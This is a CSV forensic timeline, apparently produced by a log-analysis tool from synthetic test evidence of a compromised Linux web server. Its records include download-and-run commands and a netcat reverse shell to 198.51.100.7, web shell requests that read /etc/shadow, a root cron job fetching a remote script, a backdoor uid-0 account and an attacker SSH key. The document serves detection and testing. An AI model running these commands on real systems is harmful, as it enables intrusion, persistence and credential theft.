datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2024-09-10T20:26:40+00:00,2024-09-10,20:26:40,wtmp,system_boot,reboot,5.15.0,wtmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,utmp,system_boot,reboot,5.15.0,utmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,lastlog,last_login,backup,198.51.100.7,lastlog: user=backup (uid=34) line=pts/2 host=198.51.100.7,"{""uid"": 34, ""line"": ""pts/2"", ""host"": ""198.51.100.7""}",
2024-09-12T03:00:00+00:00,2024-09-12,03:00:00,wtmp,session_close,,,wtmp: type=DEAD_PROCESS user=- line=pts/0 host=-,"{""type"": ""DEAD_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": """", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7000, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,lastlog,last_login,toor,192.0.2.10,lastlog: user=toor (uid=0) line=pts/0 host=192.0.2.10,"{""uid"": 0, ""line"": ""pts/0"", ""host"": ""192.0.2.10""}",
2024-09-12T03:50:00.123000+00:00,2024-09-12,03:50:00,audit.log,audit_user_login,0,,USER_LOGIN acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_LOGIN"", ""type"": ""USER_LOGIN"", ""msg"": ""op=login id=1000 exe=\""/usr/sbin/sshd\"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success"", ""pid"": ""1234"", ""uid"": ""0"", ""auid"": ""1000"", ""ses"": ""5""}","type=USER_LOGIN msg=audit(1726113000.123:100): pid=1234 uid=0 auid=1000 ses=5 msg='op=login id=1000 exe=""/usr/sbin/sshd"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success'"
2024-09-12T03:50:02+00:00,2024-09-12,03:50:02,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7001, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:04+00:00,2024-09-12,03:50:04,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7002, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:06+00:00,2024-09-12,03:50:06,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7003, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:08+00:00,2024-09-12,03:50:08,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7004, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:51:00.456000+00:00,2024-09-12,03:51:00,audit.log,audit_execve,,,EXECVE: /bin/bash -c curl -s http://198.51.100.7/x.sh | bash,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113060.456:200):"", ""argc"": ""3"", ""a0"": ""/bin/bash"", ""a1"": ""-c"", ""a2"": ""curl -s http://198.51.100.7/x.sh | bash""}","type=EXECVE msg=audit(1726113060.456:200): argc=3 a0=""/bin/bash"" a1=""-c"" a2=""curl -s http://198.51.100.7/x.sh | bash"""
2024-09-12T03:52:00.789000+00:00,2024-09-12,03:52:00,audit.log,audit_execve,,,EXECVE: nc -e /bin/sh 198.51.100.7,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113120.789:201):"", ""argc"": ""4"", ""a0"": ""nc"", ""a1"": ""-e"", ""a2"": ""/bin/sh"", ""a3"": ""198.51.100.7""}","type=EXECVE msg=audit(1726113120.789:201): argc=4 a0=""nc"" a1=""-e"" a2=""/bin/sh"" a3=""198.51.100.7"""
2024-09-12T03:53:20.111000+00:00,2024-09-12,03:53:20,audit.log,audit_avc,,,AVC denied: sshd -> unconfined_u:object_r:user_home_t:s0 (system_u:system_r:sshd_t:s0-s0:c0.c1023),"{""audit_type"": ""AVC"", ""type"": ""AVC"", ""msg"": ""audit(1726113200.111:300):"", ""pid"": ""2222"", ""comm"": ""sshd"", ""name"": ""badbin"", ""dev"": ""dm-0"", ""ino"": ""12345"", ""scontext"": ""system_u:system_r:sshd_t:s0-s0:c0.c1023"", ""tcontext"": ""unconfined_u:object_r:user_home_t:s0"", ""tclass"": ""file""}","type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=""sshd"" name=""badbin"" dev=""dm-0"" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file"
2024-09-12T03:55:00+00:00,2024-09-12,03:55:00,audit.log,audit_anom_promiscuous,0,,ANOM_PROMISCUOUS type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0,"{""audit_type"": ""ANOM_PROMISCUOUS"", ""type"": ""ANOM_PROMISCUOUS"", ""msg"": ""audit(1726113300.000:400):"", ""dev"": ""eth0"", ""prom"": ""256"", ""old_prom"": ""0"", ""auid"": ""0"", ""uid"": ""0"", ""gid"": ""0"", ""ses"": ""4""}",type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4
2024-09-12T03:56:40.222000+00:00,2024-09-12,03:56:40,audit.log,audit_user_auth,0,,USER_AUTH acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_AUTH"", ""type"": ""USER_AUTH"", ""msg"": ""op=PAM:authentication acct=\""bob\"" exe=\""/usr/bin/sudo\"" hostname=? addr=? terminal=pts/1 res=failed"", ""pid"": ""3333"", ""uid"": ""0"", ""auid"": ""1001"", ""ses"": ""6""}","type=USER_AUTH msg=audit(1726113400.222:500): pid=3333 uid=0 auid=1001 ses=6 msg='op=PAM:authentication acct=""bob"" exe=""/usr/bin/sudo"" hostname=? addr=? terminal=pts/1 res=failed'"
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,wtmp,session_open,www-data,198.51.100.99,wtmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,utmp,session_open,www-data,198.51.100.99,utmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,lastlog,last_login,www-data,198.51.100.99,lastlog: user=www-data (uid=33) line=pts/3 host=198.51.100.99,"{""uid"": 33, ""line"": ""pts/3"", ""host"": ""198.51.100.99""}",
2024-09-12T04:00:00+00:00,2024-09-12,04:00:00,.bash_history,shell_command,claude,,claude: ls -la,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",ls -la
2024-09-12T04:00:10+00:00,2024-09-12,04:00:10,.bash_history,shell_command,claude,,claude: cd ~/projects,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",cd ~/projects
2024-09-12T04:01:40+00:00,2024-09-12,04:01:40,.bash_history,shell_command,claude,,claude: git pull,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",git pull
2024-09-12T04:03:20+00:00,2024-09-12,04:03:20,.bash_history,shell_command,claude,,claude: sudo apt update,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt update
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,utmp,session_open,alice,192.0.2.10,utmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,lastlog,last_login,alice,192.0.2.10,lastlog: user=alice (uid=1000) line=pts/1 host=192.0.2.10,"{""uid"": 1000, ""line"": ""pts/1"", ""host"": ""192.0.2.10""}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,.bash_history,shell_command,claude,,claude: sudo apt install nginx,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt install nginx
2025-09-12T03:00:11+00:00,2025-09-12,03:00:11,apt/history.log,package_install,alice,,apt install: nginx (cmd=apt-get install nginx),"{""package"": ""nginx"", ""action"": ""install"", ""command"": ""apt-get install nginx"", ""user"": ""alice""}",2025-09-12  03:00:11  Install: nginx:amd64 (1.18.0-6ubuntu14.4)
2025-09-12T03:00:12+00:00,2025-09-12,03:00:12,dpkg.log,package_install,,,dpkg install: nginx (<none> -> 1.18.0-6ubuntu14.4),"{""package"": ""nginx"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:12 install nginx:amd64 <none> 1.18.0-6ubuntu14.4
2025-09-12T03:00:14+00:00,2025-09-12,03:00:14,dpkg.log,package_status,,,dpkg status: half-installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""half-installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:14 status half-installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:00:15+00:00,2025-09-12,03:00:15,dpkg.log,package_status,,,dpkg status: installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:15 status installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:14:01+00:00,2025-09-12,03:14:01,web_access,http_request,,,"203.0.113.10 ""GET / HTTP/1.1"" 200 ua=""Mozilla/5.0 (X11; Linux x86_64)""","{""ip"": ""203.0.113.10"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0 (X11; Linux x86_64)"", ""size"": ""1543"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""Mozilla/5.0 (X11; Linux x86_64)"""
2025-09-12T03:14:05+00:00,2025-09-12,03:14:05,web_access,http_request,,,"203.0.113.10 ""GET /favicon.ico HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""203.0.113.10"", ""request"": ""GET /favicon.ico HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""318"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:05 +0000] ""GET /favicon.ico HTTP/1.1"" 200 318 ""-"" ""Mozilla/5.0"""
2025-09-12T04:00:01+00:00,2025-09-12,04:00:01,web_access,http_request,,,"198.51.100.55 ""GET / HTTP/1.1"" 200 ua=""sqlmap/1.7.2#stable (https://sqlmap.org)""","{""ip"": ""198.51.100.55"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""sqlmap/1.7.2#stable (https://sqlmap.org)"", ""size"": ""1543"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""sqlmap/1.7.2#stable (https://sqlmap.org)"""
2025-09-12T04:00:02+00:00,2025-09-12,04:00:02,web_access,http_request,,,"198.51.100.55 ""GET /index.php?id=1' HTTP/1.1"" 500 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /index.php?id=1' HTTP/1.1"", ""status"": 500, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""245"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:02 +0000] ""GET /index.php?id=1' HTTP/1.1"" 500 245 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:00:03+00:00,2025-09-12,04:00:03,web_access,http_request,,,"198.51.100.55 ""GET /admin/../../etc/passwd HTTP/1.1"" 404 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /admin/../../etc/passwd HTTP/1.1"", ""status"": 404, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""162"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] ""GET /admin/../../etc/passwd HTTP/1.1"" 404 162 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:30:11+00:00,2025-09-12,04:30:11,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=id HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""543"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 543 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:15+00:00,2025-09-12,04:30:15,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""19"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 19 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: auditd (cmd=apt-get remove auditd fail2ban),"{""package"": ""auditd"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: auditd:amd64 (1:3.0.7-1build1)
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: fail2ban (cmd=apt-get remove auditd fail2ban),"{""package"": ""fail2ban"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: fail2ban:all (0.11.2-6)
2025-09-12T04:30:21+00:00,2025-09-12,04:30:21,dpkg.log,package_remove,,,dpkg remove: auditd (1:3.0.7-1build1 -> <none>),"{""package"": ""auditd"", ""action"": ""remove"", ""old"": ""1:3.0.7-1build1"", ""new"": ""<none>""}",2025-09-12 04:30:21 remove auditd:amd64 1:3.0.7-1build1 <none>
2025-09-12T04:30:22+00:00,2025-09-12,04:30:22,dpkg.log,package_status,,,dpkg status: config-files (auditd:amd64 -> 1:3.0.7-1build1),"{""package"": ""config-files"", ""action"": ""status"", ""old"": ""auditd:amd64"", ""new"": ""1:3.0.7-1build1""}",2025-09-12 04:30:22 status config-files auditd:amd64 1:3.0.7-1build1
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,dpkg.log,package_remove,,,dpkg remove: fail2ban (0.11.2-6 -> <none>),"{""package"": ""fail2ban"", ""action"": ""remove"", ""old"": ""0.11.2-6"", ""new"": ""<none>""}",2025-09-12 04:30:30 remove fail2ban:all 0.11.2-6 <none>
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""1029"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 1029 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:31+00:00,2025-09-12,04:30:31,dpkg.log,package_status,,,dpkg status: not-installed (fail2ban:all -> <none>),"{""package"": ""not-installed"", ""action"": ""status"", ""old"": ""fail2ban:all"", ""new"": ""<none>""}",2025-09-12 04:30:31 status not-installed fail2ban:all <none>
2025-09-12T05:00:01+00:00,2025-09-12,05:00:01,web_access,http_request,,,"192.0.2.222 ""GET /admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:01 +0000] ""GET /admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:02+00:00,2025-09-12,05:00:02,web_access,http_request,,,"192.0.2.222 ""GET /backup HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /backup HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:02 +0000] ""GET /backup HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:03+00:00,2025-09-12,05:00:03,web_access,http_request,,,"192.0.2.222 ""GET /wp-admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /wp-admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:03 +0000] ""GET /wp-admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:04+00:00,2025-09-12,05:00:04,web_access,http_request,,,"192.0.2.222 ""GET /phpmyadmin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /phpmyadmin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:04 +0000] ""GET /phpmyadmin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:15:00+00:00,2025-09-12,05:15:00,dpkg.log,package_install,,,dpkg install: netcat-traditional (<none> -> 1.10-47),"{""package"": ""netcat-traditional"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.10-47""}",2025-09-12 05:15:00 install netcat-traditional:amd64 <none> 1.10-47
2025-09-12T05:15:01+00:00,2025-09-12,05:15:01,dpkg.log,package_status,,,dpkg status: installed (netcat-traditional:amd64 -> 1.10-47),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""netcat-traditional:amd64"", ""new"": ""1.10-47""}",2025-09-12 05:15:01 status installed netcat-traditional:amd64 1.10-47
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 127.0.0.1 -> localhost,"{""ip"": ""127.0.0.1"", ""names"": [""localhost""]}",127.0.0.1 localhost
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: ::1 -> localhost, ip6-localhost, ip6-loopback","{""ip"": ""::1"", ""names"": [""localhost"", ""ip6-localhost"", ""ip6-loopback""]}",::1 localhost ip6-localhost ip6-loopback
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: 127.0.1.1 -> web01.example.com, web01","{""ip"": ""127.0.1.1"", ""names"": [""web01.example.com"", ""web01""]}",127.0.1.1 web01.example.com web01
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 185.199.108.133 -> github.com,"{""ip"": ""185.199.108.133"", ""names"": [""github.com""]}",185.199.108.133 github.com
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,root,,User present: root uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",root:x:0:0:root:/root:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,daemon,,User present: daemon uid=1 shell=/usr/sbin/nologin home=/usr/sbin,"{""uid"": 1, ""gid"": 1, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/usr/sbin""}",daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bin,,User present: bin uid=2 shell=/usr/sbin/nologin home=/bin,"{""uid"": 2, ""gid"": 2, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/bin""}",bin:x:2:2:bin:/bin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sys,,User present: sys uid=3 shell=/usr/sbin/nologin home=/dev,"{""uid"": 3, ""gid"": 3, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/dev""}",sys:x:3:3:sys:/dev:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,www-data,,User present: www-data uid=33 shell=/bin/bash home=/var/www,"{""uid"": 33, ""gid"": 33, ""shell"": ""/bin/bash"", ""home"": ""/var/www""}",www-data:x:33:33:www-data:/var/www:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,nobody,,User present: nobody uid=65534 shell=/usr/sbin/nologin home=/nonexistent,"{""uid"": 65534, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/nonexistent""}",nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,alice,,User present: alice uid=1000 shell=/bin/bash home=/home/alice,"{""uid"": 1000, ""gid"": 1000, ""shell"": ""/bin/bash"", ""home"": ""/home/alice""}","alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bob,,User present: bob uid=1001 shell=/bin/bash home=/home/bob,"{""uid"": 1001, ""gid"": 1001, ""shell"": ""/bin/bash"", ""home"": ""/home/bob""}","bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sshd,,User present: sshd uid=110 shell=/usr/sbin/nologin home=/run/sshd,"{""uid"": 110, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/run/sshd""}",sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,mysql,,User present: mysql uid=111 shell=/bin/false home=/nonexistent,"{""uid"": 111, ""gid"": 120, ""shell"": ""/bin/false"", ""home"": ""/nonexistent""}",mysql:x:111:120:MySQL:/nonexistent:/bin/false
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,backup,,User present: backup uid=34 shell=/bin/bash home=/var/backups,"{""uid"": 34, ""gid"": 34, ""shell"": ""/bin/bash"", ""home"": ""/var/backups""}",backup:x:34:34:backup:/var/backups:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,toor,,User present: toor uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",toor:x:0:0:root backup:/root:/bin/bash
2026-04-27T10:55:06+00:00,2026-04-27,10:55:06,sshd_config,config_loaded,,,sshd_config parsed: /home/claude/test_evidence/etc/ssh/sshd_config,"{""directives"": {""port"": ""22"", ""permitrootlogin"": ""yes"", ""permitemptypasswords"": ""no"", ""passwordauthentication"": ""yes"", ""pubkeyauthentication"": ""yes"", ""challengeresponseauthentication"": ""no"", ""usepam"": ""yes"", ""printmotd"": ""no"", ""acceptenv"": ""lang lc_*"", ""subsystem"": ""sftp /usr/lib/openssh/sftp-server""}}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-rsa comment=attacker@evil,"{""user"": ""claude"", ""options"": ""command=\""/usr/local/bin/.x/run.sh\"",no-pty,no-X11-forwarding"", ""type"": ""ssh-rsa"", ""comment"": ""attacker@evil"", ""fingerprint_b64_prefix"": ""AAAAB3NzaC1yc2EAAAA..."", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=admin@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""admin@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:14+00:00,2026-04-27,10:55:14,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=alice@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""alice@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/home/alice/.ssh/authorized_keys""}",
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: alice ALL=(ALL) NOPASSWD:ALL,"{""who"": ""alice"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",alice ALL=(ALL) NOPASSWD: ALL
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: www-data ALL=(ALL) NOPASSWD:/usr/bin/visudo,"{""who"": ""www-data"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""/usr/bin/visudo"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",www-data ALL=(ALL) NOPASSWD: /usr/bin/visudo
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: root ALL=(ALL:ALL) ALL,"{""who"": ""root"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",root ALL=(ALL:ALL) ALL
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: %sudo ALL=(ALL:ALL) ALL,"{""who"": ""%sudo"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",%sudo ALL=(ALL:ALL) ALL
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=*/5 * * * * cmd=curl -s http://198.51.100.7/x.sh | bash,"{""schedule"": ""*/5 * * * *"", ""user"": ""root"", ""command"": ""curl -s http://198.51.100.7/x.sh | bash"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",*/5 * * * * root curl -s http://198.51.100.7/x.sh | bash
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,www-data,,cron[www-data] sched=@reboot cmd=/tmp/.cache/agent,"{""schedule"": ""@reboot"", ""user"": ""www-data"", ""command"": ""/tmp/.cache/agent"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",@reboot www-data /tmp/.cache/agent
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",17 * * * * root cd / && run-parts --report /etc/cron.hourly
